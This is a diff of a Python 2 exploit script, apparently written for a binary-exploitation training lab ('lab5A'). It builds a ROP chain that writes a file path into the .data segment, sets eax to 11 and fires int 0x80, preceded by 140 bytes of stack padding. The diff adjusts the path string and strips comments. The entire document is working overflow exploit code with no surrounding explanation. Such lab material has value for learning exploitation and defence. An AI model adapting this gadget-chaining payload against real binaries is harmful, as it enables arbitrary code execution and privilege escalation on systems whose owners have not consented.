@@ -14,12 +14,12 @@ PADDING = pack('<I', 0x41414141)
 
 p = ''
 
-# PARAM ON STACK
+# PATH ON STACK
 # /hom
 # e/la
 # b5a/
 # .pas
-# s0
+# s000
 
 p += POP_EDX  # pop edx ; ret
 p += DATA_ADDR  # @ .data - poczatek segmentu .data (wziety 'z dupy' jako storage)
@@ -59,7 +59,7 @@ p += MOV_EDX_EAX
 p += POP_EDX  # pop edx ; ret
 p += pack('<I', 0x080eb060 + 17)
 p += POP_EAX
-p += 'b5a/'
+p += 'b5A/'
 p += MOV_EDX_EAX
 
 p += POP_EDX  # pop edx ; ret
@@ -101,12 +101,12 @@ p += pack('<I', 0x080eb060 + 60)
 p += POP_EDX
 p += pack('<I', 0x080eb060 + 48)
 
-p += XOR_EAX_EAX  # xor eax, eax ; ret
-p += EAX_ADD_3  # add eax, 3 ; ret
-p += EAX_ADD_3  # add eax, 3 ; ret
-p += EAX_ADD_3  # add eax, 3 ; ret
-p += EAX_ADD_2  # add eax, 2 ; ret
-p += INT  # int 0x80
+p += XOR_EAX_EAX
+p += EAX_ADD_3
+p += EAX_ADD_3
+p += EAX_ADD_3
+p += EAX_ADD_2
+p += INT
 
 full_payload = 'A' * 140 + p
 print full_payload
